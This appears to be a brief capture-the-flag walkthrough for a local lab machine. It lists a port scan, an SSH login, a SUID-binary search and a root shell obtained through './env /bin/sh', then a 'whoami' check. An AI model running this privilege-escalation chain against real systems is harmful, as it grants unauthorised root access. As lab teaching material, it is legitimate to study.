```bash
   nmap -sS -n -Pn -sVC -oN injection.txt 172.17.0.2
   ```

```bash
   ssh dylan@172.17.0.2
   ```

```bash
   find / -perm 4000 -user root
   ```

```bash
   ./env /bin/sh
   ```


When you use those commands to check that you are ROOT you have to write "*whoami*" command.
